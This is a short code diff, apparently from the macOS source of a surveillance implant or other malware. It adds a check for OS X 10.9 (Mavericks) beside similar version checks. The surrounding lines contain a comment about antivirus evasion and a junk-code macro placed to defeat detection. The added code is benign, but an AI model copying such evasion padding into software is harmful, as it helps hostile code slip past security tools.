@@ -859,6 +859,8 @@ static __m_MUtils *sharedUtils = nil;
                      atPath: @"/etc/authorization"];
 }
 
+
+
 - (BOOL)isMtLion
 {  // AV evasion: only on release build
   AV_GARBAGE_001
@@ -867,6 +869,13 @@ static __m_MUtils *sharedUtils = nil;
     return YES;
   
   return NO;
+}
+
+- (BOOL)isMaverics
+{
+	if (gOSMajor == 10 && gOSMinor == 9)
+		return YES;
+	return NO;
 }
 
 - (BOOL)isLion
